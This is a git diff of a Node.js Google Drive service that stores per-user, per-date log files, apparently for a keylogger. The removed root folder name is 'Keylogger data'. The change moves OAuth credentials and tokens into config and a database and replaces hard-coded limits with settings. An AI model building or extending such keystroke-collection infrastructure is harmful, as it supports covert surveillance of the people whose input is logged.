@@ -1,41 +1,44 @@
 import { google } from 'googleapis';
-// import { JWT } from 'google-auth-library';
 import { OAuth2Client } from 'google-auth-library';
 import fs from 'fs';
-import path from 'path';
-import { root_folder } from '../server.js';
+import { root_folder, DRIVE_EMAIL, credentials, DRIVE_FILE_CONFIG } from '../config.js';
+import User from '../models/User.js';
+import Drive from '../models/Drive.js';
 
 class GoogleDriveService {
-    constructor() {
+    constructor(userId) {
         this.drive = null;
         this.initializeDrive();
     }
 
     async initializeDrive() {
         try {
-            // Load service account credentials
-            // const credentials = JSON.parse(fs.readFileSync("./driveAccess.json"));
-            const credentials = JSON.parse(fs.readFileSync("./oAuthCredentials.json"));
-            // console.log(credentials)
-            // const auth = new JWT({
-            //     email: credentials.client_email,
-            //     key: credentials.private_key,
-            //     scopes: ['https://www.googleapis.com/auth/drive'],
-            // });
-            
-            const oAuth2Client = new OAuth2Client(
-                credentials.web.client_id,
-                credentials.web.client_secret,
-                credentials.web.redirect_uris[0]
-            );
+            // Load credentials from config
+            const { client_id, client_secret, redirect_uris } = credentials.web;
 
-            const token = JSON.parse(fs.readFileSync('./token.json'));
-            
+            // Fetch email from config
+            const email = DRIVE_EMAIL;
+            if (!email) {
+                throw new Error('DRIVE_EMAIL not set in environment variables.');
+            }
+
+            // Fetch Drive document for this email
+            const driveDoc = await Drive.findOne({ Email: email });
+            // console.log(driveDoc)
+            if (!driveDoc || !driveDoc.Token) {
+                throw new Error('No Google OAuth token found for this email in Drive collection.');
+            }
+            const token = JSON.parse(driveDoc.Token);
+
+            const oAuth2Client = new OAuth2Client(
+                client_id,
+                client_secret,
+                redirect_uris[0]
+            );
             oAuth2Client.setCredentials(token);
 
-            // this.drive = google.drive({ version: 'v3', auth });
             this.drive = google.drive({ version: 'v3', auth: oAuth2Client });
-            console.log('Google Drive service initialized successfully');
+            console.log('Google Drive service initialized successfully for email', email);
         } catch (error) {
             console.error('Failed to initialize Google Drive service:', error);
             throw error;
@@ -76,7 +79,7 @@ class GoogleDriveService {
     async getOrCreateUserFolder(username) {
         try {
             // First, find or create the main "keylogger data" folder
-            const rootFolderId = await this.findOrCreateFolder(root_folder, 'Keylogger data');
+            const rootFolderId = await this.findOrCreateFolder(root_folder, DRIVE_FILE_CONFIG.folderStructure.root);
             
             // Then find or create user folder
             const userFolderId = await this.findOrCreateFolder(rootFolderId, username);
@@ -101,7 +104,7 @@ class GoogleDriveService {
     async getLatestFileInDateFolder(dateFolderId) {
         try {
             const response = await this.drive.files.list({
-                q: `'${dateFolderId}' in parents and mimeType='application/json' and trashed=false`,
+                q: `'${dateFolderId}' in parents and mimeType='${DRIVE_FILE_CONFIG.mimeType}' and trashed=false`,
                 orderBy: 'createdTime desc',
                 pageSize: 1,
                 fields: 'files(id, name, size)',
@@ -144,7 +147,7 @@ class GoogleDriveService {
             await this.drive.files.update({
                 fileId: fileId,
                 media: {
-                    mimeType: 'application/json',
+                    mimeType: DRIVE_FILE_CONFIG.mimeType,
                     body: updatedContent,
                 },
             });
@@ -164,13 +167,13 @@ class GoogleDriveService {
             const fileMetadata = {
                 name: fileName,
                 parents: [dateFolderId],
-                mimeType: 'application/json',
+                mimeType: DRIVE_FILE_CONFIG.mimeType,
             };
 
             const file = await this.drive.files.create({
                 resource: fileMetadata,
                 media: {
-                    mimeType: 'application/json',
+                    mimeType: DRIVE_FILE_CONFIG.mimeType,
                     body: content,
                 },
                 fields: 'id, name, size',
@@ -208,7 +211,7 @@ class GoogleDriveService {
                 // Check file size (convert from string to number)
                 const fileSizeInMB = parseInt(latestFile.size) / (1024 * 1024);
                 
-                if (fileSizeInMB < 10) {
+                if (fileSizeInMB < DRIVE_FILE_CONFIG.maxFileSizeMB) {
                     // Append to existing file
                     await this.appendToFile(latestFile.id, logs);
                     console.log(`Appended ${logs.length} logs to existing file: ${latestFile.name}`);
